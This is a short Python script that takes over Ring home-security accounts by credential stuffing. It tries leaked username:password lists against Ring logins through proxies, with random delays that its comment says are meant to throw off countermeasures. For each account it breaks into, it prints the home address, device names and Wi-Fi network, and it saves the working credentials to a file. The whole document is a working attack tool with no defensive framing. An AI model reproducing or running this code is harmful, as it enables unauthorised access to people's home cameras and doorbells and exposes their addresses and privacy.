from ring_wardriver import Ring
import os
import time
from random import randint



path=input("Enter the path to the files: ")

def ringchecker(ringuser,ringpass):
    print("Trying "+ringuser)
    time.sleep(randint(0,5)) #giving a random sleep period to throw off the countermeasures
    try:
        ringclient = Ring(username=ringuser, password=ringpass, select_proxy=True)
        if ringclient.is_connected:
            print("Got one!")
            print(ringuser + " , " + ringpass)
            print(ringclient.devices)

            for dev in list(ringclient.stickup_cams + ringclient.chimes + ringclient.doorbells):
                # refresh data
                dev.update()

                print('Account ID: %s' % dev.account_id)
                print('Address:    %s' % dev.address)
                print('Family:     %s' % dev.family)
                print('ID:         %s' % dev.id)
                print('Name:       %s' % dev.name)
                print('Timezone:   %s' % dev.timezone)
                print('Wifi Name:  %s' % dev.wifi_name)
                print('Wifi RSSI:  %s' % dev.wifi_signal_strength)

            return True
        else:
            return False

    except Exception as e:
        print(e)
        return False

def wardrive(infilepath, outfilepath):
    #pretty simple, opens the given file, gets the user and password from it
    #checks that against ring, if it works, write that combo to an outfile
    print("wardriving on "+ infilepath)
    with open(infilepath) as fp:
        for line in fp:
            usercombo = str(line).split(':')
            if ringchecker(usercombo[0], usercombo[1]):
                with open(outfilepath, "a") as outrecordfile:
                    outrecordfile.write(line+"\n")



for entry in os.listdir(path):
    if entry.endswith(".txt"):
        wardrive(str(path+entry), "./ohexploitable.txt")
